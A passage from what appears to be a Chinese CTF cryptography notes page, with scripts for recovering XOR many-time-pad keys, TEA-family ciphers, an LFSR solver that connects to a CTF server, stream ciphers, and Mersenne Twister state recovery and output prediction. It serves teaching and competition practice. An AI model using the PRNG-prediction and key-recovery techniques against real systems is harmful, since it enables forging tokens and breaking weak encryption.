strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;)) print &quot;Fix this sentence:&quot; print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\\n&quot; # WAIT.. MANUAL STEP HERE # This output are printing a * if that character is not known yet # fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot; # if is too hard, change the target_cipher to another one and try again # and we have our key to fix the entire text! #sys.exit(0) #comment and continue if u got a good key print &#x27;------end------&#x27; for i in ciphers: target_fix(i) 交互猜： 1234567891011121314151617181920212223242526from functools import reducedef xor(*args): if len(args) == 2: x, y = args return bytes([a ^ b for a, b in zip(x, y)]) return reduce(xor, args)ct = [ b&quot;\\xc1=\\x01&#125;\\xe7\\x1c\\x94YRj\\xb3\\xa7K@\\xde\\x0c\\x9a\\xc9\\x00\\xb0ZB\\r\\x87\\r\\x8b\\x8f\\xffQ\\xc7&quot;, b&quot;\\xfc\\x1d4^\\xd0o\\xb2GE|\\x89\\xe4^]\\xcfE\\x86\\xdd\\x1e\\x8a\\r@\\x1c\\x96r\\x92\\x87\\xec\\x19\\xd4&quot;, b&quot;\\xfa\\x19!P\\x82;\\xa8G\\x10\\x7f\\x80\\xa5DP\\xdeE\\x94\\xc8S\\x9cHH\\x1f\\x8a!\\x87\\xc0\\xe3\\x1f\\xcd&quot;,]key = xor(b&quot;SECFEST&#123;&quot;, ct[0])while True: pts = [xor(key, c) for c in ct] for i, pt in enumerate(pts): print(i, pt) idx = int(input(&quot;Enter index: &quot;)) if idx == -1: break c = input(&quot;Enter next char: &quot;)[0] key += bytes([ord(c) ^ ct[idx][len(key)]]) print(&quot;Current key:&quot;, key.hex())print([xor(key, c) for c in ct]) ​ TEA / XTEA / XXTEA TEA微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。TEA 操作处理在两个 32 位无符号整型上（可能源于一个 64 位数据），并且使用一个 128 位的密钥。设计者是 Roger Needham 和 David Wheeler。 加密过程： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env pythondef encrypt(v, k): v0 = v[0] v1 = v[1] x = 0 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): x += delta x = x &amp; 0xFFFFFFFF v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vdef decrypt(v, k): v0 = v[0] v1 = v[1] x = 0x9E3779B9 * 32 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: plain = [1, 2] key = [2, 2, 3, 4] encrypted = encrypt(plain, key) print(encrypted) decrypted = decrypt(encrypted, key) print(decrypted) 12345678910111213141516171819202122232425262728293031323334353637383940414243//C版，带符号位移(unsigned int -→ int)#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; //加密函数void encrypt (int* v, int* k) &#123; int v0=v[0], v1=v[1], sum=0, i; /* set up */ int delta=0x9e3779b9; /* a key schedule constant */ int k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i &lt; 32; i++) &#123; /* basic cycle start */ sum += delta; v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125;//解密函数void decrypt (int* v, int* k) &#123; int v0=v[0], v1=v[1], sum=0x9e3779b9*32, i; /* set up */ int delta=0x9e3779b9; /* a key schedule constant */ int k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i&lt;32; i++) &#123; /* basic cycle start */ v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum -= delta; &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125; int main()&#123; int v[14656]=&#123;0&#125;,k[4]=&#123;0x67616C66, 0x6B61667B, 0x6C665F65, 0x7D216761&#125;; FILE *p1 = fopen(&quot;./tea.png.out&quot;, &quot;rb&quot;); fread(&amp;v, 4, 14656, p1); fclose(p1); for(int i=0;i&lt;14656;i+=2)&#123; decrypt(&amp;v[i], k); &#125; FILE *p2 = fopen(&quot;./tea.png&quot;, &quot;wb&quot;); fwrite(&amp;v, 4, 14656, p2); fclose(p2); return 0;&#125; XTEAXTEA 是 TEA 的升级版，增加了更多的密钥表，移位和异或操作等等。 加密过程： 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env pythondef encrypt(rounds, v, k): v0 = v[0] v1 = v[1] x = 0 delta = 0x9E3779B9 for i in range(rounds): v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF x += delta x = x &amp; 0xFFFFFFFF v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vdef decrypt(rounds, v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * rounds for i in range(rounds): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: plain = [1, 2] key = [2, 2, 3, 4] rounds = 32 encrypted = encrypt(rounds, plain, key) print(encrypted) decrypted = decrypt(rounds, encrypted, key) print(decrypted) 123456789101112131415161718192021//C版，带符号#include&lt;stdio.h&gt;int map[2] = &#123;0xB5ABA743, 0x4C5B3EE0&#125;;void decode(int* v) &#123; int sum = 0; for(int i=0; i&lt;32; ++i) sum += 0x9E3779B9; int key[] = &#123;1, 2&#125;; for(int j=0; j&lt;32; ++j) &#123; v[1] -= (((v[0] &lt;&lt; 4) ^ (v[0] &gt;&gt; 5)) + v[0]) ^ (sum + key[sum &amp; 3]); v[0] -= (((v[1] &lt;&lt; 4) ^ (v[1] &gt;&gt; 5)) + v[1]) ^ (sum + key[sum &amp; 3]); sum -= 0x9E3779B9; &#125;&#125;int main() &#123; decode(map); for(int i=0; i&lt;2; ++i) printf(&quot;%d\\n&quot;, map[i]); return 0;&#125; XXTEAXXTEA，又称 Corrected Block TEA，是 XTEA 的升级版。 加密过程： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env pythondef shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def encrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 / n x = 0 z = v[n - 1] for i in range(rounds): x = (x + delta) &amp; 0xFFFFFFFF e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1): y = v[p + 1] v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[p] p += 1 y = v[0] v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[n - 1] return vdef decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 / n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vif __name__ == &#x27;__main__&#x27;: plain = [1, 2] key = [2, 2, 3, 4] encrypted = encrypt(plain, key) print(encrypted) decrypted = decrypt(encrypted, key) print(decrypted) ​ LFSR线性反馈移位寄存器（Linear feedback shift register，LFSR）是指给定前一状态的输出，将该输出的线性函数再用作输入的移位寄存器。线性反馈移位寄存器(LFSR)归属于移位寄存器(FSR)，除此之外还有非线性移位寄存器（NFSR）。 $\\text{GF}(2)$ 上一个 $n$ 级反馈移位寄存器由 $n$ 个二元存储器与一个反馈函数 $f(a_1,a_2,\\cdots,a_n)$ 组成： 移位寄存器三要素： 初始状态：由用户确定 反馈函数：$f(a_1,a_2,\\cdots,a_n)$ 是 $n$ 元布尔函数，即函数的自变量和因变量只取0和1这两个可能值 输出序列 如果反馈函数是线性的，那么我们称其为线性反馈移位寄存器(LFSR)： LFSR的输出序列 $\\{a_n\\}$ 满足： $\\begin{cases} a_{n+1} = c_1a_{n} \\oplus c_2a_{n-1} \\oplus\\cdots\\oplus c_na_1 \\newline a_{n+2} = c_1a_{n+1} \\oplus c_2a_{n} \\oplus\\cdots\\oplus c_na_2 \\newline \\vdots \\newline a_{n+i} = c_1a_{n+i-1} \\oplus c_2a_{n+i-2} \\oplus\\cdots\\oplus c_na_i \\end{cases}$ 对于 $n$ 级线性反馈移位寄存器，最长周期为 $2^n-1$（排除全0），达到最长周期的序列一般称为 $m$ 序列。 B-M 算法 （待补充） 参考 深入分析CTF中的LFSR类题目（一） 深入分析CTF中的LFSR类题目（二） CTF竞赛密码学 之 LFSR 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#Example#coding=utf-8from pwn import *r=remote(&#x27;182.92.108.71&#x27;,30607)c=[]for i in range(10): r.recvline() r.sendlineafter(&#x27;guess: &#x27;,&#x27;0&#x27;) x=r.recvline() if &#x27;Right&#x27; in x: c+=[0] else: xx=int(x.strip().split(&#x27;is &#x27;)[1]) c+=[xx]print(c)class lfsr(): def __init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 def next(self): nextdata = (self.init &lt;&lt; 1) &amp; self.lengthmask i = self.init &amp; self.mask &amp; self.lengthmask output = 0 while i != 0: output ^= (i &amp; 1) i = i &gt;&gt; 1 nextdata ^= output self.init = nextdata return output def random(self, nbit): output = 0 for _ in range(nbit): output &lt;&lt;= 1 output |= self.next() return output mask = 0b1011001010001010000100001000111011110101N = 40key = &#x27;&#x27;for i in range(N // 4): t = c[i] for j in range(3, -1, -1): key += str(t &gt;&gt; j &amp; 1)idx = 0ans = &quot;&quot;key = key[39] + key[:40]print(key)while idx &lt; 40: tmp = 0 for i in range(40): if mask &gt;&gt; i &amp; 1: tmp ^= int(key[39 - i]) ans = str(tmp) + ans idx += 1 key = key[39] + str(tmp) + key[1:39]init = int(ans, 2)print(init)prng = lfsr(init, 0b1011001010001010000100001000111011110101, 40)for i in range(10): print(prng.random(4))for i in range(90): r.recvline() r.sendlineafter(&#x27;guess: &#x27;,str(prng.random(4))) print(r.recvline())print(r.recvall()) ​ Salsa20Salsa20是一种流式对称加密算法，类似于Chacha20，算法性能相比AES能够快3倍以上。 Salsa20算法通过将32 Byte的key和8 Byte的随机数nonce扩展为 $2^{70}$ Byte的随机字节流，通过随机字节流和异或操作实现加解密，因此Salsa20算法中随机字节流的生成为关键所在。 Salsa20算法生成随机字节流时，一次生成一个64字节的block，每一个block是通过将key、nonce和block number以及部分常量组成64字节的input，通过核函数，输出64字节的output。最终多个block组成长度为 $2^{70}$ 的随机字节流，在生成过程中，每个block相互独立。 输入 64字节的input分为16个word，每个word为4字节，由以下8部分组成： 4字节的常量0x61707865key的前16字节4字节的常量0x3320646e8字节的随机数nonce8字节的block-counter4字节的常量0x79622d32key的剩余16字节4字节的常量0x6b206574 最终64字节（16 words）组成一个4*4的矩阵。例如，对于key (1, 2, 3, 4, 5, . . . , 32)，nonce(3, 1, 4, 1, 5, 9, 2, 6)，以及 block 7的初始矩阵为： 12340x61707865, 0x04030201, 0x08070605, 0x0c0b0a090x100f0e0d, 0x3320646e, 0x01040103, 0x060209050x00000007, 0x00000000, 0x79622d32, 0x141312110x18171615, 0x1c1b1a19, 0x201f1e1d, 0x6b206574 核函数 Salsa20算法核函数将64字节的输入以矩阵形式作为参数，输出64字节的运算结果。 Salsa20核函数运算主要包括的运算如下，其中a和b皆为32bit（4 Byte）的数据： 32 bit模加：(a + b) mod 2^32 异或：a XOR b 左移：a &lt;&lt;&lt; b，其中b为常量，在Salsa20算法中左移的值为7、9、13、18 针对输入矩阵中的每个word，执行20轮的如下操作： b ⊕= (a ⊞ c) &lt;&lt;&lt; k，其中⊕为异或，⊞模加，&lt;&lt;&lt;为左移。 经过20轮计算后，将输出的矩阵核原始矩阵相加，得到输出。 Salsa20核函数具体实现如下： 1234567891011121314151617181920212223242526#define R(a,b) (((a) &lt;&lt; (b)) | ((a) &gt;&gt; (32 - (b))))void salsa20_word_specification(uint32 out[16],uint32 in[16])&#123; int i; uint32 x[16]; for (i = 0;i &lt; 16;++i) x[i] = in[i]; for (i = 20;i &gt; 0;i -= 2) &#123; // 20轮计算 x[ 4] ^= R(x[ 0]+x[12], 7); x[ 8] ^= R(x[ 4]+x[ 0], 9); x[12] ^= R(x[ 8]+x[ 4],13); x[ 0] ^= R(x[12]+x[ 8],18); x[ 9] ^= R(x[ 5]+x[ 1], 7); x[13] ^= R(x[ 9]+x[ 5], 9); x[ 1] ^= R(x[13]+x[ 9],13); x[ 5] ^= R(x[ 1]+x[13],18); x[14] ^= R(x[10]+x[ 6], 7); x[ 2] ^= R(x[14]+x[10], 9); x[ 6] ^= R(x[ 2]+x[14],13); x[10] ^= R(x[ 6]+x[ 2],18); x[ 3] ^= R(x[15]+x[11], 7); x[ 7] ^= R(x[ 3]+x[15], 9); x[11] ^= R(x[ 7]+x[ 3],13); x[15] ^= R(x[11]+x[ 7],18); x[ 1] ^= R(x[ 0]+x[ 3], 7); x[ 2] ^= R(x[ 1]+x[ 0], 9); x[ 3] ^= R(x[ 2]+x[ 1],13); x[ 0] ^= R(x[ 3]+x[ 2],18); x[ 6] ^= R(x[ 5]+x[ 4], 7); x[ 7] ^= R(x[ 6]+x[ 5], 9); x[ 4] ^= R(x[ 7]+x[ 6],13); x[ 5] ^= R(x[ 4]+x[ 7],18); x[11] ^= R(x[10]+x[ 9], 7); x[ 8] ^= R(x[11]+x[10], 9); x[ 9] ^= R(x[ 8]+x[11],13); x[10] ^= R(x[ 9]+x[ 8],18); x[12] ^= R(x[15]+x[14], 7); x[13] ^= R(x[12]+x[15], 9); x[14] ^= R(x[13]+x[12],13); x[15] ^= R(x[14]+x[13],18); &#125; for (i = 0;i &lt; 16;++i) out[i] = x[i] + in[i]; // 输入矩阵经过20轮的计算结果和原始矩阵相加得到最终输出&#125; 输出 每一次核函数运算，都能够通过key、nonce、block-counter生成64字节的输出block，经过多次输入和核函数运算，将每一次的生成结果拼接最终组成长度为 $2^{70}$ 的字节流。 1234567891011121314# Encryptfrom Crypto.Cipher import Salsa20plaintext = b&#x27;Attack at dawn&#x27;secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;cipher = Salsa20.new(key=secret)msg = cipher.nonce + cipher.encrypt(plaintext)# Decryptfrom Crypto.Cipher import Salsa20secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;msg_nonce = msg[:8]ciphertext = msg[8:]cipher = Salsa20.new(key=secret, nonce=msg_nonce)plaintext = cipher.decrypt(ciphertext) ​ Chacha20Chacha20是ChaCha系列流密码，作为Salsa密码的改良版，具有更强的抵抗密码分析攻击的特性，“20”表示该算法有20轮的加密计算。 由于是流密码，故以字节为单位进行加密，安全性的关键体现在密钥流生成的过程，即所依赖的伪随机数生成器（PRNG）的强度，加密过程即是将密钥流与明文逐字节异或得到密文，反之，解密是将密文再与密钥流做一次异或运算得到明文。 1234567891011121314# Encryptfrom Crypto.Cipher import ChaCha20plaintext = b&#x27;Attack at dawn&#x27;secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;cipher = ChaCha20.new(key=secret)msg = cipher.nonce + cipher.encrypt(plaintext)# Decryptfrom Crypto.Cipher import ChaCha20secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;msg_nonce = msg[:8]ciphertext = msg[8:]cipher = ChaCha20.new(key=secret, nonce=msg_nonce)plaintext = cipher.decrypt(ciphertext) ​ RabbitRabbit 是一种高速流密码，于 2003 年在 FSE 研讨会上首次提出。Rabbit 使用一个 128 位密钥和一个 64 位初始化向量。该加密算法的核心组件是一个位流生成器，该流生成器每次迭代都会加密 128 个消息位。Rabbit 也是一种对称加密算法。 不加盐版本：https://asecuritysite.com/encryption/rabbit2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230import collectionsimport hashlibimport randomimport rabbitimport binasciiimport sysdef enc_long(n): &#x27;&#x27;&#x27;Encodes arbitrarily large number n to a sequence of bytes. Big endian byte order is used.&#x27;&#x27;&#x27; s = &quot;&quot; while n &gt; 0: s = chr(n &amp; 0xFF) + s n &gt;&gt;= 8 return sWORDSIZE = 0x100000000rot08 = lambda x: ((x &lt;&lt; 8) &amp; 0xFFFFFFFF) | (x &gt;&gt; 24)rot16 = lambda x: ((x &lt;&lt; 16) &amp; 0xFFFFFFFF) | (x &gt;&gt; 16)def _nsf(u, v): &#x27;&#x27;&#x27;Internal non-linear state transition&#x27;&#x27;&#x27; s = (u + v) % WORDSIZE s = s * s return (s ^ (s &gt;&gt; 32)) % WORDSIZEclass Rabbit: def __init__(self, key, iv = None): &#x27;&#x27;&#x27;Initialize Rabbit cipher using a 128 bit integer/string&#x27;&#x27;&#x27; if isinstance(key, str): # interpret key string in big endian byte order if len(key) &lt; 16: key = &#x27;\\x00&#x27; * (16 - len(key)) + key # if len(key) &gt; 16 bytes only the first 16 will be considered k = [ord(key[i + 1]) | (ord(key[i]) &lt;&lt; 8) for i in range(14, -1, -2)] else: # k[0] = least significant 16 bits # k[7] = most significant 16 bits k = [(key &gt;&gt; i) &amp; 0xFFFF for i in range(0, 128, 16)] # State and counter initialization x = [(k[(j + 5) % 8] &lt;&lt; 16) | k[(j + 4) % 8] if j &amp; 1 else (k[(j + 1) % 8] &lt;&lt; 16) | k[j] for j in range(8)] c = [(k[j] &lt;&lt; 16) | k[(j + 1) % 8] if j &amp; 1 else (k[(j + 4) % 8] &lt;&lt; 16) | k[(j + 5) % 8] for j in range(8)] self.x = x self.c = c self.b = 0 self._buf = 0 # output buffer self._buf_bytes = 0 # fill level of buffer next(self) next(self) next(self) next(self) for j in range(8): c[j] ^= x[(j + 4) % 8] self.start_x = self.x[:] # backup initial key for IV/reset self.start_c = self.c[:] self.start_b = self.b if iv != None: self.set_iv(iv) def reset(self, iv = None): &#x27;&#x27;&#x27;Reset the cipher and optionally set a new IV (int64 / string).&#x27;&#x27;&#x27; self.c = self.start_c[:] self.x = self.start_x[:] self.b = self.start_b self._buf = 0 self._buf_bytes = 0 if iv != None: self.set_iv(iv) def set_iv(self, iv): &#x27;&#x27;&#x27;Set a new IV (64 bit integer / bytestring).&#x27;&#x27;&#x27; if isinstance(iv, str): i = 0 for c in iv: i = (i &lt;&lt; 8) | ord(c) iv = i c = self.c i0 = iv &amp; 0xFFFFFFFF i2 = iv &gt;&gt; 32 i1 = ((i0 &gt;&gt; 16) | (i2 &amp; 0xFFFF0000)) % WORDSIZE i3 = ((i2 &lt;&lt; 16) | (i0 &amp; 0x0000FFFF)) % WORDSIZE c[0] ^= i0 c[1] ^= i1 c[2] ^= i2 c[3] ^= i3 c[4] ^= i0 c[5] ^= i1 c[6] ^= i2 c[7] ^= i3 next(self) next(self) next(self) next(self) def __next__(self): &#x27;&#x27;&#x27;Proceed to the next internal state&#x27;&#x27;&#x27; c = self.c x = self.x b = self.b t = c[0] + 0x4D34D34D + b c[0] = t % WORDSIZE t = c[1] + 0xD34D34D3 + t // WORDSIZE c[1] = t % WORDSIZE t = c[2] + 0x34D34D34 + t // WORDSIZE c[2] = t % WORDSIZE t = c[3] + 0x4D34D34D + t // WORDSIZE c[3] = t % WORDSIZE t = c[4] + 0xD34D34D3 + t // WORDSIZE c[4] = t % WORDSIZE t = c[5] + 0x34D34D34 + t // WORDSIZE c[5] = t % WORDSIZE t = c[6] + 0x4D34D34D + t // WORDSIZE c[6] = t % WORDSIZE t = c[7] + 0xD34D34D3 + t // WORDSIZE c[7] = t % WORDSIZE b = t // WORDSIZE g = [_nsf(x[j], c[j]) for j in range(8)] x[0] = (g[0] + rot16(g[7]) + rot16(g[6])) % WORDSIZE x[1] = (g[1] + rot08(g[0]) + g[7]) % WORDSIZE x[2] = (g[2] + rot16(g[1]) + rot16(g[0])) % WORDSIZE x[3] = (g[3] + rot08(g[2]) + g[1]) % WORDSIZE x[4] = (g[4] + rot16(g[3]) + rot16(g[2])) % WORDSIZE x[5] = (g[5] + rot08(g[4]) + g[3]) % WORDSIZE x[6] = (g[6] + rot16(g[5]) + rot16(g[4])) % WORDSIZE x[7] = (g[7] + rot08(g[6]) + g[5]) % WORDSIZE self.b = b return self def derive(self): &#x27;&#x27;&#x27;Derive a 128 bit integer from the internal state&#x27;&#x27;&#x27; x = self.x return ((x[0] &amp; 0xFFFF) ^ (x[5] &gt;&gt; 16)) | \\ (((x[0] &gt;&gt; 16) ^ (x[3] &amp; 0xFFFF)) &lt;&lt; 16)| \\ (((x[2] &amp; 0xFFFF) ^ (x[7] &gt;&gt; 16)) &lt;&lt; 32)| \\ (((x[2] &gt;&gt; 16) ^ (x[5] &amp; 0xFFFF)) &lt;&lt; 48)| \\ (((x[4] &amp; 0xFFFF) ^ (x[1] &gt;&gt; 16)) &lt;&lt; 64)| \\ (((x[4] &gt;&gt; 16) ^ (x[7] &amp; 0xFFFF)) &lt;&lt; 80)| \\ (((x[6] &amp; 0xFFFF) ^ (x[3] &gt;&gt; 16)) &lt;&lt; 96)| \\ (((x[6] &gt;&gt; 16) ^ (x[1] &amp; 0xFFFF)) &lt;&lt; 112) def keystream(self, n): &#x27;&#x27;&#x27;Generate a keystream of n bytes&#x27;&#x27;&#x27; res = &quot;&quot; b = self._buf j = self._buf_bytes next = self.__next__ derive = self.derive for i in range(n): if not j: j = 16 next() b = derive() res += chr(b &amp; 0xFF) j -= 1 b &gt;&gt;= 1 self._buf = b self._buf_bytes = j return res def encrypt(self, data): &#x27;&#x27;&#x27;Encrypt/Decrypt data of arbitrary length.&#x27;&#x27;&#x27; res = &quot;&quot; b = self._buf j = self._buf_bytes next = self.__next__ derive = self.derive for c in data: if not j: # empty buffer =&gt; fetch next 128 bits j = 16 next() b = derive() res += chr(ord(c) ^ (b &amp; 0xFF)) j -= 1 b &gt;&gt;= 1 self._buf = b self._buf_bytes = j return res decrypt = encryptmessage=&quot;Hello&quot;key=&quot;qwerty&quot;iv=0key1 = hashlib.md5(key.encode()).hexdigest()print(&quot;Message:\\t\\t&quot;,message)print(&quot;IV:\\t&quot;,iv)print(&quot;Encryption password:\\t&quot;,key)print(&quot;Encryption key:\\t\\t&quot;,key1)print(&quot;\\n======Rabbit encryption========&quot;)iv=0msg=Rabbit(key1,iv).encrypt(message)print(&quot;Encrypted:\\t&quot;,binascii.hexlify(msg.encode()))text=Rabbit(key1,iv).decrypt(msg)print(&quot;Decrypted:\\t&quot;,text) ​ XorshiftXorshift 随机数生成器是 George Marsaglia 发明的一类伪随机数生成器。它们通过和自己逻辑移位后的数进行异或操作来生成序列中的下一个数。这在现代计算机体系结构非常快。它们是线性反馈移位寄存器的一个子类，其简单的实现使它们速度更快且使用更少的空间。然而，必须仔细选择合适参数以达到长周期。 问题：在循环移位异或加密中，我们已知变换后的密文 y ，以及多个偏移的密钥 ks ，要求出原文 x。 定理：在长度为 2 的方幂的二进制串中，循环移位异或变换中，如果有奇数项，那么这个变换是可逆的，否则就是不可逆的。 例： 加密：$y=x \\oplus (x \\ggg p) \\oplus (x \\ggg q)$ 解密：$x=x \\oplus (y \\ggg p) \\oplus (y \\ggg q)$ 123456789101112131415161718# y = x ^ (x&gt;&gt;&gt;p) ^ (x&gt;&gt;&gt;q)from operator import xorfrom functools import reducedef move(n, k): s = bin(n)[2:].zfill(64) k &amp;= 63 return int(s[k:] + s[:k], 2) def encrypt(x, ks): return xor(x, reduce(xor, map(lambda k: move(x, k), ks))) def decrypt(y, ks): for _ in range(6): y = encrypt(y, ks) ks = [k &lt;&lt; 1 for k in ks] return y ​ MT19937梅森旋转算法（Mersenne Twister Algorithm，简称 MT）是为了解决过去伪随机数发生器（Pseudo-Random Number Generator，简称 PRNG）产生的伪随机数质量不高而提出的新算法。该算法在 1997 年提出。 Mersenne Twister 最常见的实现方式使用 624 个 32 bits 的初始状态。这些整数按顺序分发（分发前对每个初始数进行转换），分发完后对该状态应用某种算法以获取下一组 624 个整数。以及可以通过得到连续的 624 个输出，还原出原来的 624 个 states，再根据原算法推算出接下来每个 state 下一次的 value，从而算出接下来的输出。 32 bits实现： 12345678910111213141516171819202122232425262728293031def _int32(x): return int(0xFFFFFFFF &amp; x) class MT19937: # 根据seed初始化624的state def __init__(self, seed): self.mt = [0] * 624 self.mt[0] = seed self.mti = 0 for i in range(1, 624): self.mt[i] = _int32(1812433253 * (self.mt[i - 1] ^ self.mt[i - 1] &gt;&gt; 30) + i) # 提取伪随机数 def extract_number(self): if self.mti == 0: self.twist() y = self.mt[self.mti] y = y ^ y &gt;&gt; 11 y = y ^ y &lt;&lt; 7 &amp; 2636928640 y = y ^ y &lt;&lt; 15 &amp; 4022730752 y = y ^ y &gt;&gt; 18 self.mti = (self.mti + 1) % 624 return _int32(y) # 对状态进行旋转 def twist(self): for i in range(0, 624): y = _int32((self.mt[i] &amp; 0x80000000) + (self.mt[(i + 1) % 624] &amp; 0x7fffffff)) self.mt[i] = (y &gt;&gt; 1) ^ self.mt[(i + 397) % 624] if y % 2 != 0: self.mt[i] = self.mt[i] ^ 0x9908b0df 分为三段： 导入seed，初始化伪随机数发生器 每次生成 mt[i] 是由前一项进行运算得到的，第一项 mt[0] == seed，总生成 624 项整数的列表（以及其他参数）作为 state。 中间的元组类型有 625 项，前 624 项即是之前提到的整数，而第 625 项（此时等于 624）是该 state 此时对应的第几个整数，也就是说，再下一次执行 extract_number() 函数时的 state 里面应该调用第几个整数。 进行 twist() 函数 注意是在 extract_number() 函数内可能会执行 twist()，进行 twist() 函数需要满足的条件，也就是每 624 项作为一轮直接执行 extract_number() 函数里后面的位运算以及抽取随机数的操作，而下一轮 624 项需要进行 twist() 函数替换state。 这样一来，就意味着每 624 项的列表作为一次 state，当输出完 624 个伪随机数之后，需要通过 twist() 函数变换 state，变换完成之后再进行输出伪随机数，以此类推。 设新生成的 state 列表为 mt&#39;，而原来的 state 列表为 mt（注意在MT19937原代码中并没有赋值新的列表，只是不断地更新原来地列表） 在 twist() 函数中，每生成的新的一个 state 列表中的 mt&#39;[i]，只和在原来的 state 中的 mt[i+1] 以及 mt[i+397] 有关。 而当 i+1 或者 i+397 大于 624 时，也就是超过了一个 state 列表总长度时，那么 mt[i+1] 或者 mt[i+397] 实际上是 mt&#39;[(i+1) % 624] 或者 mt&#39;[(i+397) % 624]。 继续 extract_number() 函数 在判断执行 twist() 函数与否之后，从目前的 state 列表中单独抽取每个数进行运算，运算结果即是输出的随机数。也就是说，state 列表里的每个数都单独的进行与常量的位运算。 random模块getrandbits 函数在收到超出32比特的参数，会把已生成的state放在低位，高位放置新生成的state。 攻击求后随机数（逆 extract_number）假设已知624个从开始连续输出的随机数，需要预测之后每一个输出的随机数，只需要逆转输出的随机数组成 state列表，然后设置伪随机数发生器的 state 即可，然后输出需要预测的随机数。 Mersenne Twister Predictor https://github.com/kmyk/mersenne-twister-predictor 123456789import randomfrom mt19937predictor import MT19937Predictorpredictor = MT19937Predictor()for _ in range(624): x = random.getrandbits(32) predictor.setrandbits(x, 32)assert random.getrandbits(32) == predictor.getrandbits(32) randcrack https://github.com/tna0y/Python-random-module-cracker 12345678910111213import random, timefrom randcrack import RandCrackrandom.seed(time.time())rc = RandCrack()for i in range(624): rc.submit(random.getrandbits(32)) # Could be filled with random.randint(0,4294967294) or random.randrange(0,4294967294)print(&quot;Random result: &#123;&#125;\\nCracker result: &#123;&#125;&quot; .format(random.randrange(0, 4294967295), rc.predict_randrange(0, 4294967295))) 原始 12345678910111213141516171819202122232425262728293031323334353637383940# 脚本1# right shift inversedef inverse_right(res, shift, bits=32): 